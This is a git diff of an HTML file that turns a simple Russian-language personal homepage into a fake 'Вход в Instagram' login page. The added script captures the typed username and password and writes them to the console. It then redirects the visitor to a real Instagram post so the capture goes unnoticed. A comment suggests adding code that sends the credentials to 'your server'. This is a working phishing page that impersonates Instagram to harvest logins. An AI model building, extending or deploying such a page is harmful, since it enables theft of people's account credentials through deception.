@@ -3,42 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Мой Сайт</title>
+    <title>Вход в Instagram</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
         }
-        header {
-            background: #3897f0;
-            color: white;
-            padding: 10px 0;
-            text-align: center;
-        }
-        main {
+        .login-container {
+            background: white;
             padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        footer {
-            text-align: center;
-            padding: 10px 0;
-            background: #ddd;
-            position: relative;
-            bottom: 0;
+        input {
             width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #2a77c0;
+        }
+        .message {
+            margin-top: 20px;
+            color: green;
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Добро пожаловать на мой сайт!</h1>
-    </header>
-    <main>
-        <p>Это мой первый проект на GitHub.</p>
-    </main>
-    <footer>
-        <p>&copy; 2024 Мой Сайт</p>
-    </footer>
+    <div class="login-container">
+        <h2>Вход в Instagram</h2>
+        <input type="text" id="username" placeholder="Логин" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button onclick="submitLogin()">Войти</button>
+    </div>
+
+    <script>
+        function submitLogin() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            console.log("Логин: " + username + ", Пароль: " + password);
+            
+            // Здесь вы можете добавить код для отправки данных на ваш сервер или обрабатывать их другим образом.
+            // Например, для простоты, мы просто выводим их в консоль.
+            
+            // Перенаправление на рилсы Instagram
+            window.location.href = "https://www.instagram.com/p/C9MQuQpoBJj/";
+        }
+    </script>
 </body>
 </html>
